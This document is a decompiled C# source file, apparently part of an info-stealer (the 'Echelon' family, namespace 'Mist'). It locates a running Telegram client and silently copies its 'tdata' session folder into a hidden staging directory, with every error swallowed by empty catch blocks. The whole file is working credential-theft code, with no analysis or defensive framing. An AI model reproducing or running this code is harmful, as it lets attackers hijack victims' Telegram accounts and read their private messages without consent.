using System;
using System.Diagnostics;
using System.IO;

namespace Mist
{
	// Token: 0x02000062 RID: 98
	public class Telegram
	{
		// Token: 0x06000275 RID: 629 RVA: 0x00011F34 File Offset: 0x00010134
		public static void GetTelegram(string Echelon_Dir)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Telegram");
				if (processesByName.Length >= 1)
				{
					string text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
					if (Directory.Exists(text))
					{
						string toDir = Echelon_Dir + "\\Telegram_" + ((int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString();
						Telegram.CopyAll(text, toDir);
						Telegram.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000276 RID: 630 RVA: 0x00011FD8 File Offset: 0x000101D8
		private static void CopyAll(string fromDir, string toDir)
		{
			try
			{
				Directory.CreateDirectory(toDir).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				string[] array = Directory.GetFiles(fromDir);
				for (int i = 0; i < array.Length; i++)
				{
					Telegram.CopyFile(array[i], toDir);
				}
				array = Directory.GetDirectories(fromDir);
				for (int i = 0; i < array.Length; i++)
				{
					Telegram.CopyDir(array[i], toDir);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000277 RID: 631 RVA: 0x00012044 File Offset: 0x00010244
		private static void CopyFile(string s1, string toDir)
		{
			try
			{
				string fileName = Path.GetFileName(s1);
				if (!Telegram.in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
				{
					string destFileName = toDir + "\\" + fileName;
					File.Copy(s1, destFileName);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000278 RID: 632 RVA: 0x000120AC File Offset: 0x000102AC
		private static void CopyDir(string s, string toDir)
		{
			try
			{
				Telegram.in_patch = true;
				Telegram.CopyAll(s, toDir + "\\" + Path.GetFileName(s));
				Telegram.in_patch = false;
			}
			catch
			{
			}
		}

		// Token: 0x04000152 RID: 338
		public static int count;

		// Token: 0x04000153 RID: 339
		private static bool in_patch;
	}
}
